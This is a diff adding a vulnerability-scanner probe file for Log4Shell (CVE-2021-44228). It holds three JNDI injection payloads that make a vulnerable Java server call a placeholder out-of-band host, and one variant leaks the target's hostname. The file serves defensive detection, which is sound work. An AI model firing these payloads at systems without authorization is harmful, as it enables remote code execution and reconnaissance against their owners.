@@ -1,0 +1,43 @@
+{
+  "category": "log4shell",
+  "description": "Apache Log4j 2 JNDI lookup RCE — Log4Shell (CVE-2021-44228). OOB detection ONLY: the payload carries the literal COLLABORATOR token which the runtime substitutes with a real Burp Collaborator subdomain; a collaborator interaction confirms the vulnerable log sink. Never hardcode a callback domain (Rule 9a).",
+  "contexts": {
+    "log4shell_jndi_2021": {
+      "description": "CVE-2021-44228 — Log4j 2 evaluates ${jndi:ldap://...} lookups in logged strings, causing the server to resolve/fetch an attacker-controlled JNDI endpoint. Detection = inject the COLLABORATOR JNDI probe into commonly-logged inputs and confirm an out-of-band DNS/LDAP interaction.",
+      "tech_match": ["java", "log4j", "log4j2", "apache", "spring", "struts", "vmware", "elasticsearch"],
+      "param_match": ["q", "search", "username", "user", "name", "id", "token", "callback", "redirect"],
+      "probes": [
+        {
+          "payload": "${jndi:ldap://COLLABORATOR/x}",
+          "description": "JNDI LDAP lookup probe. If a Collaborator DNS/LDAP interaction fires, the input reached a vulnerable Log4j sink (CVE-2021-44228). Runtime replaces COLLABORATOR with a live Collaborator subdomain.",
+          "matchers": [
+            {"type": "collaborator", "interaction": "any"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 90,
+          "variables": {"COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "${jndi:dns://COLLABORATOR/x}",
+          "description": "JNDI DNS lookup variant — some deployments block LDAP egress but resolve DNS. Collaborator DNS interaction confirms the vulnerable Log4j lookup. COLLABORATOR substituted at runtime.",
+          "matchers": [
+            {"type": "collaborator", "interaction": "dns"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 85,
+          "variables": {"COLLAB_REQUIRED": true}
+        },
+        {
+          "payload": "${jndi:ldap://${hostName}.COLLABORATOR/x}",
+          "description": "Nested-lookup variant — embeds ${hostName} so the OOB interaction also leaks the target hostname label, proving evaluation of nested Log4j lookups. COLLABORATOR substituted at runtime.",
+          "matchers": [
+            {"type": "collaborator", "interaction": "any"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"COLLAB_REQUIRED": true}
+        }
+      ]
+    }
+  }
+}
